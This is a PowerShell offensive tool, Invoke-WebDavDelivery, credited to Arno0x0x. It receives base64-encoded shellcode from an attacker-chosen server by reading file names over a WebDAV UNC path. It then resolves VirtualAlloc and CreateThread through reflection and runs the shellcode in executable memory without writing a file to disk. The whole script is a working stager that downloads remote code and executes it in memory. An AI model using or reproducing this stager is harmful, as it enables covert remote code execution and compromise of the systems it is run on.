function Invoke-WebDavDelivery
{
	<#
	.SYNOPSIS
	Receive a shellcode over WebDav PROPFIND channel, then load it into memory and execute it.
	
	This script requires its server side counterpart (webdavdelivery.py) to communicate with and actually deliver the payload data.
    
	Function: Invoke-WebDavDelivery
	Author: Arno0x0x, Twitter: @Arno0x0x

	.EXAMPLE
	PS C:\> Invoke-WebDavDelivery -ServerName myserverexample.com

   	#>
	
	[CmdletBinding(DefaultParameterSetName="main")]
		Param (

    	[Parameter(Mandatory = $True)]
    	[ValidateNotNullOrEmpty()]
    	[String]$ServerName = $( Read-Host "Enter server name: " )
    )
	
	Write-Verbose "Contacting server [$ServerName]"
	#------------------------------------------------------------------------------------------------------
	# Download the base64 encoded payload
	$EncodedPayload = (cmd /c "pushd \\$ServerName & dir /b /a-d & popd" | Out-String) -replace "`n|`r" -replace "_","/"
	
	#------------------------------------------------------------------------------------------------------
	# Convert base64 data received back to byte array
	$Data = [System.Convert]::FromBase64String($EncodedPayload.ToString())
	
	#------------------------------------------------------------------------------------------------------
	# Invoke the shellcode
	Write-Verbose "Invoking shellcode"
	function Get-NativeMethodHandle {
		Param ($DLLName, $MethodName)		
		$SystemAssembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
		return $SystemAssembly.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($SystemAssembly.GetMethod('GetModuleHandle')).Invoke($null, @($DLLName)))), $MethodName))
	}

	function Get-DelegateType {
		Param (
			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $Parameters,
			[Parameter(Position = 1)] [Type] $ReturnType = [Void]
		)

		$TypeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
		$TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters).SetImplementationFlags('Runtime, Managed')
		$TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters).SetImplementationFlags('Runtime, Managed')
		return $TypeBuilder.CreateType()
	}

	$FuncAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-NativeMethodHandle kernel32.dll VirtualAlloc), (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $Data.Length,0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($Data, 0, $FuncAddr, $Data.length)

	$ThreadHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-NativeMethodHandle kernel32.dll CreateThread), (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$FuncAddr,[IntPtr]::Zero,0,[IntPtr]::Zero)
	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-NativeMethodHandle kernel32.dll WaitForSingleObject), (Get-DelegateType @([IntPtr], [Int32]))).Invoke($ThreadHandle,0xffffffff) | Out-Null
}